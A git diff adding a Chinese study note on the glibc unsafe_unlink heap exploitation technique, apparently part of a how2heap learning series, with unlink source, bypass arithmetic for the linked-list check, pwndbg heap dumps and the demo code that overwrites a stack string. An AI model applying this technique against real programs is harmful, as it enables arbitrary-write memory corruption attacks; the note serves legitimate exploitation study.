@@ -479,3 +479,336 @@ Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17ee010 0x17e
 ## unsafe_unlink
 
 > 重头戏！来了！准备绕晕！
+
+#### 1.unlink何时触发
+
+ unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。<u>一般发生在程序进行堆块释放之后。</u>然后这个的漏洞一般是<u>不安全的unlink解链操作造成</u>的。
+
+似乎即使unlink相关的bug，在Ubuntu18没有，要用ubuntu16跑。
+
+#### 2.未加防护机制的unlink
+
+解链的过程如下图：
+
+![1566139357955](/img/how2heap/unlink1.png)
+
+其实就是进行了一个<u>在双向链表中删除节点P的操作</u>，让P堆块和BK堆块合并成一个空闲堆块。
+
+操作就是：
+
+```c++
+p->fd->bk = p->bk  //【p的后驱指针指向的chunk的前驱指针】指向【p的前驱指针指向的chunk】
+p->bk->fd = p->fd
+```
+
+##### （1）攻击条件
+
+![1566139357955](/img/how2heap/unlink2.png)
+
+- 上图两个堆块<u>物理相邻</u>，其中<u>P已空闲(存在FD、BK)，而Q还是inuse</u>。
+- 如果可以利用某漏洞(比如堆溢出、越界写等等)，可以控制堆块P的FD和BK的值，分别修改为：Fd=addr – 3*4, Bk = except value，就可以形成一个在任意地址写的利用了。
+  - addr就表示任意一个想控制的可写地址
+  - except value 是想在addr中写入的值。
+- <u>之后会进行free（Q）</u>，而达到任意地址写任意值的目的。
+
+说明：原来inuse的chunk会被free，那么这两个物理相邻的chunk就会都是空闲块，也就会触发解链unlink。同时由于fastbin大小的free chunk默认是不会进行合并的【保持了prev_inuse的标记】，因此需要触发unlink的话，要求chunk足够大，不在fastbin中【64-bits，最小为fastbin chunk为128B=0x80，本题用户就申请了0x80，加8B，对齐16后，就是0x90的size字段了，不属于fastbin chunk】。
+
+##### （2）攻击原理：
+
+当我们 free(Q) 时
+
+- glibc 判断这个块是 small chunk
+- 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并
+- 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并
+- 继而<u>对 P 采取 unlink 操作</u>，使得Q堆块和P堆块的合并操作。
+
+>以32位系统为例【如果是64bits则4改为8】
+>
+>首先通过堆溢出，对P的fd和bk字段赋值，即：
+>
+>1. FD = P->fd = addr – 3*4
+>2. BK = P->bk = except value
+>
+>free（Q）时，对P进行解链：
+>
+>1. FD->bk =BK , 即 \*(addr-3\*4+3\*4) = BK = except value
+>  注：因为前面构造Fd=addr – 3\*4,所以这里解链的时候就造成了\*(addr) = BK=except value的操作，也就成功向任意地址addr写入任意内容except value。
+>2. BK->fd =FD , 即 \*(except value + 2\*4) = FD = addr – 3\*4
+>
+>比如说将这个攻击运用到got表覆写，即将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。
+
+注：
+
+- 对chunk的各个字段的定位，都是通过偏移实现的。
+  - ->fd即+2\*4
+  - ->bk即+3\*4
+- **需要确保 expect value +8 地址具有可写的权限**，并且如果expect value+8 处的值被破坏了，需要想办法绕过。
+
+#### 3.加了防护机制的unlink
+
+这就是当前的unlink
+
+unlink的源码：
+
+```c
+//unlink是一个宏，其中P指针是通过mem2chunk转换的，也就是chunk头的地址，而不是chunk的用户地址
+//既然要解链，肯定是pwndbg中那个双向链表中链入的地址，也就是chunk头的地址进行解链
+1343 /* Take a chunk off a bin list */
+1344 #define unlink(AV, P, BK, FD) {                                            \
+1345     FD = P->fd;                                                               \
+1346     BK = P->bk;                                                               \
+1347     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
+1348       malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
+1349     else {                                                                    \
+1350         FD->bk = BK;                                                          \
+1351         BK->fd = FD;                                                          \
+1352         if (!in_smallbin_range (P->size)                                      \
+1353             && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
+1354             if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        \
+1355                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
+1356               malloc_printerr (check_action,                                  \
+1357                                "corrupted double-linked list (not small)",    \
+1358                                P, AV);                                        \
+1359             if (FD->fd_nextsize == NULL) {                                    \
+1360                 if (P->fd_nextsize == P)                                      \
+1361                   FD->fd_nextsize = FD->bk_nextsize = FD;                     \
+1362                 else {                                                        \
+1363                     FD->fd_nextsize = P->fd_nextsize;                         \
+1364                     FD->bk_nextsize = P->bk_nextsize;                         \
+1365                     P->fd_nextsize->bk_nextsize = FD;                         \
+1366                     P->bk_nextsize->fd_nextsize = FD;                         \
+1367                   }                                                           \
+1368               } else {                                                        \
+1369                 P->fd_nextsize->bk_nextsize = P->bk_nextsize;                 \
+1370                 P->bk_nextsize->fd_nextsize = P->fd_nextsize;                 \
+1371               }                                                               \
+1372           }                                                                   \
+1373       }                                                                       \
+1374 }
+```
+
+在解链之前，有一个unlink的防护，即检查FD->bk  || BK->fd 是否等于P【`__builtin_expect (FD->bk != P || BK->fd != P, 0)`】，也就是说如果我们直接对FD【P->fd】，或者BK【P->bk】直接赋值的方法，是无法绕过这个检查的，会直接corrupt。
+
+也就是说我们对chunkP的fd和bk字段的覆盖必须满足：
+
+```c++
+P->fd->bk=P
+P->bk->fd=P
+```
+
+那么我们就来计算一下，如果要满足上述约束，addr和except value会被限定为取什么值？
+
+>P->fd->bk=P，将其看成一个等式，由于P->bk=addr - 3\*4则
+>
+>\*(addr - 3\*4 + 3\*4) = P 
+>
+>即addr = &P，并且fd字段为addr - 3\*4=&P-3\*4才可以绕过P->fd->bk=P的检查。
+>
+>同理，将P->bk->fd看成一个等式，由于P->bk=except value，则
+>
+> \*(except value + 2*4) = P ，> except value = &P-2\*4  
+>
+>也就是说chunkP的bk字段为&P-2\*4才可以绕过P->bk->fd的检查
+
+综上，我们把当前已空闲的chunkP的fd内容设置为(&P-3\*4)，把bk的内容设置为（&P-2\*4）的时候，就可以绕过这个安全检测机制。
+
+#### 4.切回正题——pwndbg调试解析
+
+```assembly
+pwndbg> b main
+pwndbg> print chunk0_ptr  #打印chunk0_ptr的内容，即指向地址
+$1 = (uint64_t *) 0x0
+pwndbg> print &chunk0_ptr #打印chunk0_ptr的存储的地址
+$2 = (uint64_t **) 0x602070 <chunk0_ptr>
+```
+
+由于`chunk0_ptr `在bss段，大致情况如下：
+
+![1566139357955](/img/how2heap/unlink3.png)
+
+接下来执行，初始化堆，构建两个堆块分配：
+
+```c++
+int malloc_size = 0x80; //we want to be big enough not to use fastbins
+int header_size = 2;
+chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
+uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
+```
+
+调试可知，chunk的情况如下：
+
+```assembly
+pwndbg> heap
+0x603000 PREV_INUSE {  #chunk0_ptr
+  prev_size = 0x0, 
+  size = 0x91,  #0x90是chunk的大小，1是标志位P
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x603090 PREV_INUSE {  #chunk1_ptr
+  prev_size = 0x0, 
+  size = 0x91, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x603120 PREV_INUSE { #top chunk
+  prev_size = 0x0, 
+  size = 0x20ee1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+pwndbg> print chunk0_ptr 
+$3 = (uint64_t *) 0x603010
+pwndbg> print chunk1_ptr 
+$4 = (uint64_t *) 0x6030a0
+```
+
+![1566139357955](/img/how2heap/unlink4.png)
+
+接下来，在chunk0**内部**伪造一个空闲chunk堆块：
+
+```c++
+	//首先将留出chunk0_ptr[0]和chunk0_ptr[1]当作prev_size字段和size字段
+	//chunk0_ptr[2]和chunk0_ptr[3]作为伪造chunk的fd字段和bk字段
+	//为了绕过防护机制，fd内容设置为(&chunk0_ptr-3*8)，把bk的内容设置为（&chunk0_ptr-2*8）
+	//从而此后对伪造chunk F进行unlink的时候，可以绕过F->fd->bk=F,F->bk->fd=F的检查
+	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
+	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
+	//通过为了营造攻击条件，需要设置伪造chunk F本身为free chunk，也就是需要设置下一个物理相邻chunk P的标志位P位0，prev_size字段为伪造chunk F的size。
+	uint64_t *chunk1_hdr = chunk1_ptr - header_size; //chunk1_ptr指针上移2个单位，指向P的chunk头地址
+	chunk1_hdr[0] = malloc_size; //设置prev_size字段为0x80，原来chunk Q为0x90，扣除chunk Q的头部，剩下的chunk F的大小为0x80
+//即我们缩小chunk1的presize(表示的是chunk0的size),好让free认为chunk0是从我们伪造的堆块开始的。，所以这样就会让chunkF和chunk1连接在一起。
+	chunk1_hdr[1] &= ~1; //修改chunk P的prev in use标志位为0，指示chunk F为free
+```
+
+此时内存中的情况为：
+
+```assembly
+pwndbg> heap
+0x603000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x91, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x602058, 
+  bk_nextsize = 0x602060 <stderr@@GLIBC_2.2.5>
+}
+0x603090 {
+  prev_size = 0x80, 
+  size = 0x90, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x603120 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20ee1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+```
+
+![1566139357955](/img/how2heap/unlink5.png)
+
+通过上述设置后，成功在一个in use chunk Q中伪造了一个空闲chunk F，并设置了chunk F的fd和bk字段，以绕过对F进行unlink时进行的防护机制。
+
+接下来要对chunk1 prt进行free【`free(chunk1_ptr);`】，从而调用unlink（F），对F位置的定位是通过prev size确定的，也就是说是调用`unlink（0x603090-0x80=0x603010）`，是对chunk头地址进行unlink。
+
+现在我们分析，unlink操作对内存的影响：
+
+```c++
+FD = P->fd; //获取chunk F的fd字段，即FD=&chunk0_ptr-(sizeof(uint64_t)*3);
+BK = P->bk; //获取chunk F的bk字段，即BK=&chunk0_ptr-(sizeof(uint64_t)*2);
+if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     
+	 malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
+else {                                                                    
+	FD->bk = BK;//FD->bk=*(&chunk0_ptr-3*8+3*8)=&chunk0_ptr-2*8,即*(&chunk0_ptr)=&chunk0_ptr-2*8.
+	BK->fd = FD;//FD->bk=*(&chunk0_ptr-2*8+2*8)=&chunk0_ptr-3*8
+    //即*(&chunk0_ptr)=&chunk0_ptr-3*8,也就是说最终把在chunk0_ptr的存储地址[&]的内容[*]修改为&chunk0_ptr-3*8，也就是让chunk0_ptr指针指向chunk0_ptr存储地址低三个内存单元的位置【&chunk0_ptr-3*8】
+```
+
+即chunk0_ptr存储地址0x602070下写入0x602070-3*8=0x602058，也就使得chunk0_ptr[0]指向0x602058，chunk0_ptr[3]指向0x602070，结果如下：
+
+```assembly
+pwndbg> x/10xg 0x602050
+0x602050:	0x0000000000000000	0x0000000000000000
+0x602060 <stderr@@GLIBC_2.2.5>:	0x00007ffff7dd2540	0x0000000000000000
+0x602070 <chunk0_ptr>:	0x0000000000602058	0x0000000000000000 
+#可以看到chunk0_ptr的存储地址下的值为0x0000000000602058
+0x602080:	0x0000000000000000	0x0000000000000000
+0x602090:	0x0000000000000000	0x0000000000000000
+```
+
+![1566139357955](/img/how2heap/unlink6.png)
+
+接下来是正式的利用unlink攻击的例子：
+
+```c++
+	//在栈上分配8字节的空间
+	//pwndbg> print &victim_string 
+	//$8 = (char (*)[8]) 0x7fffffffde20
+	char victim_string[8];
+	strcpy(victim_string,"Hello!~");
+	//写入“Hello!~”
+	//pwndbg> print  victim_string 
+	//$13 = "Hello!~"
+	
+	chunk0_ptr[3] = (uint64_t) victim_string;//此时将chunk0_ptr的存储地址下的值修改为&victim_string，也就是使得chunk0_ptr指向的地址为栈上地址&victim_string。
+	//从而对chunk0_ptr[0]的修改就是对victim_string的修改
+	fprintf(stderr, "Original value: %s\n",victim_string); //输出 Hello!~
+	chunk0_ptr[0] = 0x4141414142424242LL;//赋值为BBBBAAAA
+	fprintf(stderr, "New Value: %s\n",victim_string);//输出 BBBBAAAA
+```
+
+![1566139357955](/img/how2heap/unlink8.png)
+
+
+
+unlink攻击的效果其实是<u>，让一个指针指向一个离其存储地址很近的某个位置，通过偏移修改其存储位置下的内容，也就是间接修改了这个指针的指向，从而首先对任意地址的读写操作。</u>
+
+#### 5.其他
+
+以前的攻击还需要设置在伪造chunk的时候设置chunk F的size字段。
+
+是为了绕过unlink中“**(chunksize(P) != prev_size (next_chunk(P)) == False**”的校验。
+
+也就是说**我们还需要确保，fake chunk F的size字段和下一个堆块的presize字段的值是一样的【毕竟这两个实际是一个东西】**。经过了这个设置,就可以过掉”(chunksize(P) != prev_size (nextchunk(P)) == False”的校验了。
+
+那么size的值其实可以设置为两种，一种是0x80，一种是0x0。
+
+0x80很好理解，就直接满足chunk F的size字段=下一个堆块的presize字段。
+
+但为什么0x0也可以能通过？
+
+这里就需要知道(chunksize(P) != prevsize (next_chunk(P)) == False这个检查是怎么进行的。
+
+<u>就这里的fake chunk来说，先获取fake chunk的size值,然后通过这个size值加上fake chunk的地址【这里指的是chunk mem地址】再减去chunk头部大小去获取下一个chunk的presize值,然后对比size和presize是否相等.</u>
+
+<u>但是这里fake chunk的size是0，也就是说在去找找一个chunk的presize的时候，实际上找到的是fake chunk的presize,两个都是0,自然就是相等的。</u>
+
+而我们将fake chunk的size设置为0x80也能过检查的原因是,这时候获取下一个chunk的presize是正常获取的,而下一个chunk就是chunk1，chunk1的presize已经被设置为了0x80，两个值也是刚好相等。
+
+**所以我在想之前伪造的chunk F确实size字段是0x0【由于堆区的初始化默认就是0x0】，可能也就恰好绕过了这个检测。**
+
+验证：如果修改chunk F的size字段为别的值，确实是会看到`corrupted size vs. prev_size`！因此这个检查依旧在，只是unlink源码中不直接可见。
+
+#### 参考链接
+
+- [看很全又很杂的unsafe_unlink部分吧](https://zoepla.github.io/2018/05/how2heap系列(基础篇)/)
+- [讲了unlink时候size字段的设置](https://www.anquanke.com/post/id/86808)
+
+> 结束啦！撒花:white_flower::cherry_blossom:
+
+
+
+
+
